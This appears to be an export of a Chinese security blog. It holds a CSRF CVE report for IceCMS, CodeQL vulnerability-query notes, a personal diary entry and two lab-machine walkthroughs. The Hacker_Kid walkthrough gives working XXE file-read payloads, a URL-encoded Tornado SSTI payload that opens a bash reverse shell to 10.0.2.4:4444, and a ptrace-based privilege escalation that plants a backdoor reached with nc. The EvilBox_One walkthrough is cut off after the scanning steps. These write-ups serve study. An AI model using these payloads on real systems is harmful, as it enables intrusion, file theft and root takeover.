<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">while</span>(*envp != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(*envp);</span><br><span class="line">        envp++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; args; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(args[i]);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="type">char</span> *aryPoint[<span class="number">3</span>] = &#123;</span><br><span class="line">        <span class="string">&quot;Hello&quot;</span>,</span><br><span class="line">        <span class="string">&quot;world&quot;</span>,</span><br><span class="line">        <span class="string">&quot;C++&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/02/Notes-Decompile/13.png" class title="This is an example image">



]]></content>
      <categories>
        <category>x队</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE deatail</title>
    <url>/2023/10/27/CVE-deatail/</url>
    <content><![CDATA[<blockquote>
<p>[Suggested description]<br>IceCMS v2.0.1 is vulnerable to Cross Site Request Forgery (CSRF).</p>
<hr>
<p>[Vulnerability Type]<br>Cross Site Request Forgery (CSRF)</p>
<hr>
<p>[Vendor of Product]<br><a href="https://github.com/Thecosy/IceCMS">https://github.com/Thecosy/IceCMS</a></p>
<hr>
<p>[Affected Product Code Base]<br>IceCMS - v2.0.1</p>
<hr>
<p>[Affected Component]<br>After the administrator open the following page and click the the Submit request, cause the CSRF vulnerability.(exp : <a href="https://github.com/Thecosy/IceCMS/issues/17">https://github.com/Thecosy/IceCMS/issues/17</a>)</p>
<hr>
<p>[Root cause]<br>The request header does not have csrftoken added.</p>
</blockquote>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
  </entry>
  <entry>
    <title>立个长期的flag</title>
    <url>/2023/08/10/%E7%AB%8B%E4%B8%AA%E9%95%BF%E6%9C%9F%E7%9A%84flag/</url>
    <content><![CDATA[<p>2023-08-10</p>
<p><a href="https://hackerone.com/hacktivity/overview">https://hackerone.com/hacktivity/overview</a></p>
<p>把 hackone 上面所有的文章全部学习，并做好记录、应用到实际中</p>
<hr>
]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>作死</tag>
      </tags>
  </entry>
  <entry>
    <title>Record</title>
    <url>/2023/07/10/Record/</url>
    <content><![CDATA[<p>2023-08-06</p>
<p>predicate 没有返回值，做限定</p>
<p>exists 根据内部的子查询返回true or false</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">override predicate isSource(DataFlow::Node src) &#123; src instanceof RemoteFlowSource &#125;</span><br></pre></td></tr></table></figure>

<p>这是<code>SDK</code>自带的规则，里面包含了大多常用的Source入口。我们使用的SpringBoot也包含在其中</p>
<hr>
<p>1、找一个新版的简单点，能跑的 dos 脚本，有的话最好，然后根据老版的dos思路改</p>
<p>2、直接把老版的思路改，显然有点不符合实用主义</p>
<p><a href="https://github.com/webraybtl/CodeQLpy">https://github.com/webraybtl/CodeQLpy</a></p>
<p>CWE-730 redos</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 表达式声明：</span><br><span class="line">* Expr expSrc，</span><br><span class="line">* </span><br><span class="line">* 方法声明:</span><br><span class="line">* Method method</span><br><span class="line">* Method：Method是一个表示Java程序中方法的类。它包含有关方法的信息，如方法名称、所在的类、</span><br><span class="line">* 参数类型、返回类型等。你可以使用Method来分析方法的定义、签名和其他属性。</span><br><span class="line">* </span><br><span class="line">* 方法的访问，所有方法的属性：</span><br><span class="line">* MethodAccess：MethodAccess是一个表示Java程序中对方法的访问的类。它包含有关方法访问的信息，</span><br><span class="line">* 如方法调用的位置、参数传递、调用者等。你可以使用MethodAccess来分析方法的调用、使用情况和调用者的上下文。</span><br><span class="line">* </span><br><span class="line">* 简而言之，Method用于表示方法的定义和属性，而MethodAccess用于表示方法的访问和调用。</span><br><span class="line">* </span><br><span class="line">* 在CodeQL查询中，你可以使用这两个类来进行不同类型的分析。例如，你可以使用Method来查找具有特定属性的方法，</span><br><span class="line">* 如静态方法、私有方法或抽象方法。而使用MethodAccess则可以查找调用了特定方法的代码行，或者分析方法的调用图。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 该脚本用于测试DoS漏洞，检查传递的参数是否进行了适当的限制。</span><br><span class="line"> * 请将待测试的Java源代码与该脚本放在同一个CodeQL项目中进行分析。</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line">// Rule: 检查数据库查询的参数是否有限制一次性的查询数量</span><br><span class="line">predicate hasUnrestrictedQuery(db: Database, query: Expr) : bool &#123;</span><br><span class="line">  exists(MethodAccess methodAccess |</span><br><span class="line">    methodAccess.getMethod().getName() = &quot;executeQuery&quot; and</span><br><span class="line">    methodAccess.getArgument(0) = query and</span><br><span class="line">    methodAccess.getQualifier() = db</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Rule: 检查传递的pagesize参数是否进行了适当的限制</span><br><span class="line">predicate hasUnrestrictedPageSize(pageSize: Expr) : bool &#123;</span><br><span class="line">  exists(MethodAccess methodAccess |</span><br><span class="line">    methodAccess.getMethod().getName() = &quot;setPageSize&quot; and</span><br><span class="line">    methodAccess.getArgument(0) = pageSize</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Rule: 检查类中具体参数是否进行了适当的限制</span><br><span class="line">predicate hasUnrestrictedParameter(classType: Type, parameter: Parameter) : bool &#123;</span><br><span class="line">  exists(MethodAccess methodAccess |</span><br><span class="line">    methodAccess.getMethod().getDeclaringType() = classType and</span><br><span class="line">    methodAccess.getArgument(parameter.getIndex()) = parameter</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Rule: 检查List的长度是否进行了适当的限制</span><br><span class="line">predicate hasUnrestrictedListSize(list: Expr) : bool &#123;</span><br><span class="line">  exists(MethodAccess methodAccess |</span><br><span class="line">    methodAccess.getMethod().getName() = &quot;size&quot; and</span><br><span class="line">    methodAccess.getQualifier() = list</span><br><span class="line">  )</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Rule: 检查DoS漏洞</span><br><span class="line">from MethodAccess methodAccess, Method method, Parameter parameter, ClassType classType, Expr pageSize, Expr list</span><br><span class="line">where</span><br><span class="line">  methodAccess.getMethod() = method and</span><br><span class="line">  methodAccess.getArgument(parameter.getIndex()) = pageSize and</span><br><span class="line">  methodAccess.getMethod().getDeclaringType() = classType and</span><br><span class="line">  methodAccess.getQualifier() = classType and</span><br><span class="line">  hasUnrestrictedQuery(_, pageSize) or</span><br><span class="line">  hasUnrestrictedPageSize(pageSize) or</span><br><span class="line">  hasUnrestrictedParameter(classType, parameter) or</span><br><span class="line">  hasUnrestrictedListSize(list)</span><br><span class="line">select methodAccess, &quot;Potential DoS vulnerability: unrestricted parameter usage&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @name Arbitrary file write during archive extraction (&quot;Zip Slip&quot;)</span><br><span class="line"> * @description Extracting files from a malicious archive without validating that the</span><br><span class="line"> *              destination file path is within the destination directory can cause files outside</span><br><span class="line"> *              the destination directory to be overwritten.</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @id java/zipslip</span><br><span class="line"> * @problem.severity error</span><br><span class="line"> * @security-severity 7.5</span><br><span class="line"> * @precision high</span><br><span class="line"> * @tags security</span><br><span class="line"> *       external/cwe/cwe-022</span><br><span class="line"> * Zip Slip是一个广泛存在的关键存档提取（critical archive extraction）漏洞，</span><br><span class="line"> * 该漏洞允许攻击者在系统中任意写文件，尤其是会导致远程命令执行。</span><br><span class="line"> * </span><br><span class="line"> * zip解压，任意文件上传</span><br><span class="line"> * source应该是识别外面输入的压缩文件</span><br><span class="line"> * sink应该是解压操作</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.security.ZipSlipQuery</span><br><span class="line">import ZipSlipFlow::PathGraph</span><br><span class="line">//导入PathGraph命名空间，并将其视为ZipSlipFlow命名空间的子命名空间。</span><br><span class="line">//因此，PathGraph命名空间中定义的查询文件或模块可以在ZipSlipFlow命名空间中使用。</span><br><span class="line"></span><br><span class="line">// ZipSlipFlow 也是调用的 DataFlow::Node，识别sink为 archive entry</span><br><span class="line">// A sink that represents a file creation, such as a file write, copy or move operation.</span><br><span class="line">from ZipSlipFlow::PathNode source, ZipSlipFlow::PathNode sink</span><br><span class="line">where ZipSlipFlow::flowPath(source, sink)</span><br><span class="line">select source.getNode(), source, sink,</span><br><span class="line">  &quot;Unsanitized archive entry, which may contain &#x27;..&#x27;, is used in a $@.&quot;, sink.getNode(),</span><br><span class="line">  &quot;file system operation&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">    source: 获取到入参为类参数且其中包含 List&lt;&gt; / BatchVO&lt;&gt; 字段</span><br><span class="line"></span><br><span class="line">    sink:</span><br><span class="line">    1、(1.1)类中是否有长度限制注解，（1.2）是否有自定义写的size判断，foreach循环</span><br><span class="line">    2、(1)是否 List 字段赋值给其他变量，（2）新的 List 变量是否有做限制，foreach循环</span><br><span class="line"></span><br><span class="line">    0、获取所有参数为类，类名不包括&lt;，类成员包括 List&lt;&gt;</span><br><span class="line">    1、判断方法是否有类注解 @PaginationCheck</span><br><span class="line">    2、判断类参数涉及 List是否有 @Size 注解</span><br><span class="line">    3、判断类参数是否调用 size()方法做判断</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    处理措施：</span><br><span class="line">    1、类注解 @PaginationCheck</span><br><span class="line">    2、类成员变量注解 @Size</span><br><span class="line">    3、List&lt;&gt;可以在参数声明限制，参数声明注解 @Size</span><br><span class="line">    4、手段判断 if (xx.size() &gt; xx ) 限制</span><br><span class="line"></span><br><span class="line">    为什么参数名为 p0</span><br><span class="line">*/</span><br><span class="line">import java</span><br><span class="line"></span><br><span class="line">// 定义一个规则来判断参数是否为List类型</span><br><span class="line">// predicate isListParameter(Parameter p) &#123;</span><br><span class="line">//     p.getType().implementsInterface(&quot;java.util.List&quot;)</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">// from Class c, Parameter p</span><br><span class="line">// where p.getType().(Class) = c</span><br><span class="line">// // and not exists(c.getName().indexOf(&quot;&lt;&quot;))</span><br><span class="line">// and c.getName() = &quot;MultipartFile&quot;</span><br><span class="line">// // c.getAField().getType()</span><br><span class="line">// select c.getName(), c.getAField(), c.getAField().getType(), p.getName()</span><br><span class="line"></span><br><span class="line">// 判断方法中是否包含类参数</span><br><span class="line">// predicate isListParameter(MethodAccess m) &#123;</span><br><span class="line">//     exists(Class c | m.getParameter)</span><br><span class="line">// &#125;</span><br><span class="line"></span><br><span class="line">// 创建一个谓词来遍历方法的每个参数名和值</span><br><span class="line">// predicate traverseMethodArguments(MethodAccess methodAccess, string methodName, Expr[] arguments, string argumentName, Expr argumentValue) &#123;</span><br><span class="line">//     // 确定方法调用的名称和参数</span><br><span class="line">//     methodAccess.getMethod().getName() = methodName and</span><br><span class="line">//     methodAccess.getArguments() = arguments and</span><br><span class="line">//     // 使用谓词来遍历参数名和值</span><br><span class="line">//     methodAccess.getArgumentName(argumentName, argumentValue)</span><br><span class="line">//   &#125;</span><br><span class="line"></span><br><span class="line">predicate hasSize(Class c)&#123;</span><br><span class="line">    exists(Annotation a, Parameter p | p.getType().(Class) = c</span><br><span class="line">        and not exists(c.getName().indexOf(&quot;&lt;&quot;))</span><br><span class="line">        and exists(c.getAField().toString().indexOf(&quot;List&lt;&quot;))</span><br><span class="line">        and a.getAnnotatedElement() = c.getAField()</span><br><span class="line">        and a.toString() = &quot;Size&quot;</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据你的最新信息，如果 implementsInterface 被弃用了，那么在最新版本的 CodeQL 中判断类型的方法可能会有所不同。在这种情况下，你可以使用 instanceOf 谓词来判断类型是否符合你的需求。以下是一个示例代码，演示了如何使用 instanceOf 谓词来判断类型是否为 List&lt;&gt;：</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line"></span><br><span class="line">// 查询入口：查找类型为 List&lt;&gt; 的成员</span><br><span class="line">from ClassMember member</span><br><span class="line">where</span><br><span class="line">  // 判断成员的类型是否为 List&lt;&gt;</span><br><span class="line">  member.getType() instanceof ClassType and</span><br><span class="line">  member.getType().asClassType().getQualifiedName() = &quot;java.util.List&quot;</span><br><span class="line">select member</span><br><span class="line">在上述查询代码中，我们使用 instanceof 谓词来检查成员的类型是否为 ClassType，然后使用 asClassType() 方法获取类类型，最后判断类类型的限定名称是否为 &quot;java.util.List&quot;。</span><br><span class="line"></span><br><span class="line">请根据你的具体需求修改查询条件和类名称，以适应你的情况。</span><br><span class="line"></span><br><span class="line">如果你还有其他问题或需要进一步帮助，请随时提问。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>菜鸟</category>
      </categories>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>周日晚的碎碎念</title>
    <url>/2022/12/11/%E5%91%A8%E6%97%A5%E6%99%9A%E7%9A%84%E7%A2%8E%E7%A2%8E%E5%BF%B5/</url>
    <content><![CDATA[<p>这次的双休过得是最云里雾里的 ! </p>
<p>疫情开放了，想着多锻炼身体就约了前同事去爬山，主要是有两方面考量。</p>
<ol>
<li>长时间没运动，上班久坐，已经出现不适</li>
<li>周六下午一般都是玩，还不如去爬山，反正也学习不下</li>
</ol>
<p>重点是第二个原因，事与愿违。</p>
<p>以前的周六都是上午睡得满，下午基本也静不下心，都是玩游戏、看动漫之类的，到晚上才勉强做了点正事，然后周日可能就下午也会做点正事，这样双休就过去了。</p>
<p>所以这次是想，周六比起玩游戏啥的还不如去爬山运动。但结果导致，周日一整天都没心思干正事。我个人的玩乐是有点<strong>病态</strong>的。就疯狂玩游戏，大部分还是单机，一局个把小时，就一个人玩，或是看动漫，<strong>与其说停不下，应该是我不想停下来，只要不停下来，就不会想起原先的计划，以及那些许的罪恶感。</strong></p>
<p>这就造成了一种现象，玩游戏的时候，一局单机游戏两个小时，随便开，打不赢重新打；看动漫都是一部又一部，根本不想停下来，也不是游戏有多好玩或是动漫有多好看，就是不想停下来。时常出现眼睛酸痛或是头晕，都不怎么停下来。</p>
<p>造成这些情况主要是因为以前娱乐时养成的不良习惯，另一方面就是，<strong>报复性娱乐</strong>。跟报复性熬夜类似，平常工作，所以周六日一定是毫无忌惮地放松下；周六去爬山了，娱乐的时间被挤占了，那就一定要熬夜或是隔天补回来，虽然没有明确地正常想，但事实的行动已经表明就是这样，因此这周六的爬山造成的是完全相反的结果。</p>
<p>也许应该把工作和娱乐混在一起，没必要分得那么开，把工作日和休息日的节奏把控相似，因为目前工作并不痛苦，压力并不大，大多都是自怨自艾罢了。</p>
<p>关于朋友相聚也有些感想，现在周围的圈子并不适合我，应该认识一些新朋友，线上线下都可以，不想再参加没有实际意义的聚会和抱怨大会了。</p>
]]></content>
      <categories>
        <category>日常向</category>
      </categories>
      <tags>
        <tag>吐槽</tag>
      </tags>
  </entry>
  <entry>
    <title>Hacker_Kid</title>
    <url>/2022/12/01/Hacker-Kid/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.10</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/02.png" class title="This is an example image">



<p><strong>0x03 服务识别</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53,80,9999 -sV 10.0.2.10</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/03.png" class title="This is an example image">

<p>可以看到53端口开放的服务是 domain，版本是BIND 9，这是一款DNS服务器，就是用来把域名解析到IP的。默认是开启53端口的TCP(用于同步记录)和UDP(用于解析域名)的，探测下UDP是否开启。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/04.png" class title="This is an example image">



<p><strong>0x04 Web页面探测</strong></p>
<p>访问开放的web服务</p>
<img src="/2022/12/01/Hacker-Kid/05.png" class title="This is an example image">



<p>各个标签点击后并无响应请求，右键查看源代码看到有注释的信息。</p>
<img src="/2022/12/01/Hacker-Kid/06.png" class title="This is an example image">



<p>提示我们用 GET 请求参数 page_no 去访问页面，但参数值范围不清楚，拿bp爆破下试试。</p>
<img src="/2022/12/01/Hacker-Kid/07.png" class title="This is an example image">



<p>可以看到 page_no 为21时响应不同，访问试试</p>
<img src="/2022/12/01/Hacker-Kid/08.png" class title="This is an example image">



<p>页面下面多了一行红色小字，提示有子域名存在后门漏洞，例如 hackers.blackhat.local 。那就先添加下本地域名解析。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加内容如下</span></span><br><span class="line">10.0.2.10 blackhat.local</span><br><span class="line">10.0.2.10 hackers.blackhat.local</span><br></pre></td></tr></table></figure>



<p><strong>0x05 DNS区域传输</strong></p>
<p>访问 hackers.blackhat.local 试试</p>
<img src="/2022/12/01/Hacker-Kid/09.png" class title="This is an example image">



<p>提示信息一直说 DIG me more。补充下，DIG工具是Linux上用于查询DNS解析记录的，而刚才服务识别也发现了 53 端口开放着 DNS 服务器，那就来 DIG 一下吧。</p>
<img src="/2022/12/01/Hacker-Kid/10.png" class title="This is an example image">



<p>可以看到查询到了更多的域名解析记录，把相关子域名都加入hosts文件解析。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加内容如下</span></span><br><span class="line">10.0.2.10       hackers.blackhat.local</span><br><span class="line">10.0.2.10       blackhat.local</span><br><span class="line">10.0.2.10       hackerkid.blackhat.local</span><br><span class="line">10.0.2.10       ns1.blackhat.local</span><br><span class="line">10.0.2.10       mail.blackhat.local</span><br><span class="line">10.0.2.10       hacker.blackhat.local.blackhat.local</span><br></pre></td></tr></table></figure>



<p>前面扫描端口时开放了 80 和 9999 端口，那就对新增的这几个子域名逐个访问，发现了一个登录页，一个注册页，但显然不是同一个功能。</p>
<img src="/2022/12/01/Hacker-Kid/11.png" class title="This is an example image">

<img src="/2022/12/01/Hacker-Kid/12.png" class title="This is an example image">



<p><strong>0x06 XXE注入攻击 &amp; PHP封装器</strong></p>
<p>现在我们啥没有，直接注册试试。发现响应信息有这么个特点，无论输入什么，都提示<strong>邮箱不合法</strong>，并把<strong>邮箱信息打印</strong>出来。而且数据传输格式是 xml。这就想起了 XXE 漏洞，猜测后台就是解析用户 xml 信息并打印邮箱信息。</p>
<img src="/2022/12/01/Hacker-Kid/13.png" class title="This is an example image">



<p>XXE 测试，注入点是邮箱信息</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/14.png" class title="This is an example image">



<p>可以看到有个 saket 用户有 bash权限，那就尝试用 XXE 读取 saket 相关的文件。尝试读取默认的<strong>SSH公私钥文件</strong>（.ssh&#x2F;authorized_keys），无果。多番尝试后读取了目录下的 .bashrc 文件，读取过程中需要 <strong>base64 编码</strong>将文件信息带出，可能是系统默认识别为执行代码，编码带出则为文本。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/15.png" class title="This is an example image">



<p><strong>0x07 SSTI模板注入</strong></p>
<p>解码后的文件中有个账号密码，还记得我们之前有个登录页面吗，尝试登录，失败！！！</p>
<img src="/2022/12/01/Hacker-Kid/16.png" class title="This is an example image">



<p>观察了一下，这密码是 <strong>Saket!#$%@!!</strong> ，那对应的账号会不会是 saket 而不是 admin，成功登录！！！</p>
<img src="/2022/12/01/Hacker-Kid/17.png" class title="This is an example image">



<p>看到登录后的页面通过获取 GET 传入的 name 参数，直接显示在页面上，会不会存在 <strong>SSTI 模板注入</strong>漏洞。现在各种开发语言如：JAVA(velocity 模板等)、PHP(Smarty 模板等)、Python(Tornado 模板等)，都存在后端进行前端模板渲染，这期间如果没做过滤，就可能存在对应模板的任意表达式执行。</p>
<p>根据前面 nmap 服务识别可知，服务端用的是 <strong>Tornado</strong> 模板，先尝试用通用渲染方式探测是否存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;%3C%1+abcxyz%%3E[abcxyz]</span><br></pre></td></tr></table></figure>



<p>看到报错，说明确实解析到了，存在漏洞</p>
<img src="/2022/12/01/Hacker-Kid/18.png" class title="This is an example image">



<p>测试解析占位符格式，哪种形式的参数被解析</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/19.png" class title="This is an example image">



<p>可以看到第二种解析形式被成功解析，则注入表达式要在两重括号内。表达式的敏感字符默认会被过滤，需要对 **{ %**，做URL编码，详细编码如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/4444 0&gt;&amp;1&quot;&#x27;)&#125;&#125;  #表达式内容作编码</span><br></pre></td></tr></table></figure>

<p>把需要被表达式解析的{}、()、%、空格、’’、””全部做 url 编码，相关参数的 . 符号就不用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%7b%25%20import%20os%20%25%7d%7b%7bos.system%28%27bash%20-c%20%22bash%20-i%20%3e%26 %2fdev%2ftcp%2f10.0.2.4%2f4444%200%3e%261%22%27%29%7d%7d</span><br></pre></td></tr></table></figure>



<p>拿到了 saket 账户的 shell，还需要一波提权。</p>
<img src="/2022/12/01/Hacker-Kid/20.png" class title="This is an example image">



<p><strong>0x08 Capabilitie提权</strong></p>
<p>把寻常的提权方式试一遍：</p>
<ol>
<li>unam -a 内核提权</li>
<li>sudo -l  查看是否有 sudo 权限配置不当</li>
<li>是否有 suid、sgid 设置不当的文件</li>
</ol>
<p>都没有找到，实在头大。秉着绝大多数提权都是权限相关的操作管理不当，继续找权限配置相关的操作，想到了 Capabilitie 这个 Linux下的权限管理机制。</p>
<p>Capabilitie 是从Linux 内核2.2开始引入的，简单来说就是更细致的权限划分，比如 Wireshark 抓包，并非赋予整个程序抓取底包的权限，而是单独把抓取网络原始数据的能力赋予 Wireshark 进程。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admim=eip /usr/bin/dumpcap  <span class="comment">#赋予 cap_net_raw、cap_net_admim能力</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#详细可参考：https://man7.org/linux/man-pages/man7/capabilities.7.html</span><br></pre></td></tr></table></figure>



<p>秉着这个思路，看是否有 Capabilitie 配置不当的权限。查看当前 Capabilitie 配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null <span class="comment">#递归查询</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/21.png" class title="This is an example image">



<p>可以看到 python2 有  cap_sys_ptrace+ep 权限点，这个是一个调试程序相关的权限，这种涉及底层的权限大多是高权限，则可以利用 python2 的注入来实现提权。先查看以 root 运行的程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -U root  <span class="comment">#随便选个 root 程序，这里选了apache服务，线程号801</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/22.png" class title="This is an example image">



<p>注入脚本 inject.py，参考如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/zlgxzswjy/p/15185591.html</span><br></pre></td></tr></table></figure>



<p>执行注入脚本，会把后门注入到801这个服务中，然后默认开启5600服务，以供远程连接：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2<span class="number">.7</span> inject.py <span class="number">801</span>   <span class="comment">#注入后门</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/23.png" class title="This is an example image">



<p>远程连接后门：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.10 5600  <span class="comment">#远程连接</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/24.png" class title="This is an example image">]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>EvilBox_One</title>
    <url>/2022/11/23/EvilBox-One/</url>
    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/01.png" class title="This is an example image">



<p><strong>0x02 端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.9</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/02.png" class title="This is an example image">



<p><strong>0x03 服务发现</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80 -A 10.0.2.9</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/03.png" class title="This is an example image">



<p><strong>0x04 多重路径爆破</strong></p>
<p>看到只开放了 22 端口和 80 端口，初步尝试 <strong>SSH 爆破无果</strong>，访问页面试试</p>
<img src="/2022/11/23/EvilBox-One/04.png" class title="This is an example image">



<p>只有一个 Apache 初始页面，对于这样的页面思路就是<strong>路径爆破</strong>了。先试着访问默认的 robots.txt 是否存在。</p>
<img src="/2022/11/23/EvilBox-One/05.png" class title="This is an example image">



<p>接着使用 gobuster 进行路径爆破（其他工具皆可，此工具为 GO 语言编写，速度较快）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,hyml,jsp</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/06.png" class title="This is an example image">



<p>只发现了一个二级目录 &#x2F;secret，此<strong>页面访问为空</strong>，<strong>右键查看源代码也为空</strong>，那对二级目录继续尝试爆破</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.9/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,hyml,jsp</span><br></pre></td></tr></table></figure>

<img src="/2022/11/23/EvilBox-One/07.png" class title="This is an example image">



<p><strong>0x05 文件参数爆破&amp;文件包含漏洞</strong></p>
